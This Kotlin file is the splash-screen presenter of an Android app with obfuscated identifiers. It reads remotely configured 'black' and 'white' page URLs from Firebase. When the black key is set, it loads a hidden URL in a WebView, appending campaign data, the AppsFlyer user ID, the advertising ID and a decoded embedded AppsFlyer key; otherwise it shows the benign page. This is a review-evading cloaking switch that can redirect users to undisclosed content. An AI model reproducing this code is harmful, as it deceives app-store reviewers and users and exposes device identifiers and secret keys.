package com.kosmo.so.cos.com.SplashScreen4kwe2

import android.net.Uri
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.kosmo.so.cos.com.BuildConfig
import com.kosmo.so.cos.com.Utils4kwe2.SharedPreferenceCommands4kwe2.putWebViewURL4kwe2
import com.kosmo.so.cos.com.Utils4kwe2.URLParams4kwe2
import com.kosmo.so.cos.com.Utils4kwe2.UtilPackage4kwe2.decodeBase64ToString4kwe2

class SplashPresenter4kwe2(private val methods4kwe2: SplashMethods4kwe2) {

    companion object {
        const val firebaseDefaultKey4kwe2 = "cosdefaultkey"
        const val firebaseBlackKey4kwe2 = "cosblackpage"
        const val firebaseWhiteKey4kwe2 = "coswhitepage"

        var firebaseWhiteVal4kwe2: String? = null
        var firebaseBlackVal4kwe2: String? = null
        var firebaseDefaultVal4kwe2: String? = null


    }

    fun setupFirebaseConfigs4kwe2()  {
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                }
            )
            setDefaultsAsync(
                mapOf(
                    firebaseBlackKey4kwe2 to "empty"
            ))
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    firebaseBlackVal4kwe2 = getString(firebaseBlackKey4kwe2)
                    firebaseDefaultVal4kwe2 = getString(firebaseDefaultKey4kwe2)
                    firebaseWhiteVal4kwe2 = getString(firebaseWhiteKey4kwe2)
                }
            }
        }
    }


    fun setupUrlLink4kwe2 () {
        val urlLink4kwe2 = if (firebaseBlackVal4kwe2 != null && !firebaseBlackVal4kwe2.equals("empty"))
            parseURLLinks4kwe2() else firebaseWhiteVal4kwe2
        methods4kwe2.loadSharedPreferences4kwe2().putWebViewURL4kwe2(urlLink4kwe2 ?: return)
        methods4kwe2.startActivity4kwe2()
    }

    private fun parseURLLinks4kwe2 (): String {
        if (URLParams4kwe2.status4kwe2.equals("Non-organic")) {
            return if (URLParams4kwe2.key4kwe2?.length == 20) Uri.parse(firebaseBlackVal4kwe2).buildUpon()
                .appendQueryParameter("key", URLParams4kwe2.key4kwe2)
                .appendQueryParameter("bundle", methods4kwe2.loadPackageName4kwe2())
                .appendQueryParameter("sub2", URLParams4kwe2.campParam24kwe2)
                .appendQueryParameter("sub3", URLParams4kwe2.campParam34kwe2)
                .appendQueryParameter("sub4", URLParams4kwe2.adGroup4kwe2)
                .appendQueryParameter("sub5", URLParams4kwe2.adSet4kwe2)
                .appendQueryParameter("sub6", URLParams4kwe2.afChannel4kwe2)
                .appendQueryParameter("sub7", URLParams4kwe2.mediaSource4kwe2)
                .toString()
                .plus("&sub10=${URLParams4kwe2.APPSFLYER_UID_4kwe2}||${URLParams4kwe2.GAID4kwe2}||${BuildConfig.APPSFLYER_KEY.decodeBase64ToString4kwe2()}")
            else Uri.parse(firebaseBlackVal4kwe2).buildUpon()
                .appendQueryParameter("key", firebaseDefaultVal4kwe2)
                .appendQueryParameter("bundle", methods4kwe2.loadPackageName4kwe2())
                .appendQueryParameter("sub4", URLParams4kwe2.adGroup4kwe2)
                .appendQueryParameter("sub5", URLParams4kwe2.adSet4kwe2)
                .appendQueryParameter("sub6", URLParams4kwe2.afChannel4kwe2)
                .appendQueryParameter("sub7", "Default")
                .toString()
                .plus("&sub10=${URLParams4kwe2.APPSFLYER_UID_4kwe2}||${URLParams4kwe2.GAID4kwe2}||${BuildConfig.APPSFLYER_KEY.decodeBase64ToString4kwe2()}")
        } else {
            return Uri.parse(firebaseBlackVal4kwe2).buildUpon()
                .appendQueryParameter("key", firebaseDefaultVal4kwe2)
                .appendQueryParameter("bundle", methods4kwe2.loadPackageName4kwe2())
                .appendQueryParameter("sub7", "Organic")
                .toString()
                .plus("&sub10=${URLParams4kwe2.APPSFLYER_UID_4kwe2}||${URLParams4kwe2.GAID4kwe2}||${BuildConfig.APPSFLYER_KEY.decodeBase64ToString4kwe2()}")
        }
    }

}